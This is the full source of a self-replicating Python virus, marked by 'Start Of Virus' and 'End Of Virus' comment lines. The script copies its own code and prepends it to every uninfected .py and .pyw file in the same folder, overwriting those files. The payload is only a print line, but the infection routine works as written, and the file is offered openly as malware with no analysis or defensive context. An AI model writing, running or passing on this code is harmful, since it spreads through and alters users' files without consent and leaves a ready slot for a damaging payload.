### Start Of Virus ###
import sys
import glob

#gets the script and python files in same folder as virus
code = []
with open(sys.argv[0], 'r') as f:
  lines = f.readlines()

virus_area = False
for line in lines:
  if line == '### Start Of Virus ###\n':
    virus_area = True
  if virus_area:
    code.append(line)
  if line == '### End Of Virus ###\n':
    break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
#infect other files in folder
#check if script is infected
for script in python_scripts:
  with open(script, 'r') as f:
    script_code = f.readlines()

  infected = False
  #if infected already wont do anything
  for line in script_code:
    if line == '### Start Of Virus ###\n':
      infected = True
      break
  #if not infected it will infected with virus
  if not infected:
    final_code = []
    final_code.extend(code)
    final_code.extend('\n')
    final_code.extend(script_code)

    with open(script, 'w') as f:
      f.writelines(final_code)

#mellicious pece of code(payload)
print('example virus has infected this file')

### End Of Virus ###